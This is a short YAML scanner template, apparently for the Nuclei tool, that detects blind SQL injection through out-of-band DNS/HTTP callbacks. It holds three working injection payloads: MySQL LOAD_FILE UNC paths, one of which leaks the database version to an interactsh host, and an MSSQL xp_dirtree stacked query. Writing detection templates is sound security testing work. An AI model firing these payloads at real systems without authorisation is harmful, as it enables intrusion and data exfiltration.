id: m7-sqli-oob
info:
  name: M7 - SQLi Out-of-Band Exfiltration Detection
  author: Sharlix
  severity: critical
  description: Blind SQLi via OOB DNS/HTTP exfiltration
  tags: sqli,oob,blind,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1' AND LOAD_FILE(CONCAT('\\\\',version(),'.{{interactsh-url}}\\share\\a'))-- -"
      - "{{BaseURL}}?id=1'; exec master..xp_dirtree '//{{interactsh-url}}/a'-- -"
      - "{{BaseURL}}?id=1' AND 1=1 AND 'msf'='msf' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\share')-- -"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
